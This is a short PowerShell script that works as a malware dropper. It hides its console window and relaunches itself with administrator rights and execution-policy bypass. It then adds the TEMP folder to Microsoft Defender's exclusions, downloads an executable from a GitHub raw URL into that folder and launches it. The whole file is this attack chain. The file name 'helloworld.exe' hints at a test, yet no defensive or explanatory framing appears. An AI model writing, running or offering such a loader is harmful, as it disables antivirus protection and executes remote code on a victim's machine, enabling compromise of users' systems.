Add-Type -Name W -Namespace C -MemberDefinition '[DllImport("Kernel32.dll")] public static extern IntPtr GetConsoleWindow();[DllImport("User32.dll")] public static extern bool ShowWindow(IntPtr h,int c);' -ErrorAction SilentlyContinue
$w = [C.W]::GetConsoleWindow()
if ($w -ne [IntPtr]::Zero) { [C.W]::ShowWindow($w, 0) | Out-Null }

if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process powershell -WindowStyle Hidden -Verb RunAs -ArgumentList "-ExecutionPolicy Bypass -File `"$PSCommandPath`""
    exit
}

$tempDir = $env:TEMP

Add-MpPreference -ExclusionPath $tempDir
Write-Host "[+] Excluded: $tempDir"

$url = "https://github.com/analysisw/test/raw/refs/heads/main/helloworld.exe"
$out = Join-Path $tempDir "helloworld.exe"
Invoke-WebRequest -Uri $url -OutFile $out
Write-Host "[+] Downloaded: $out"

Start-Process $out
Write-Host "[+] Launched."
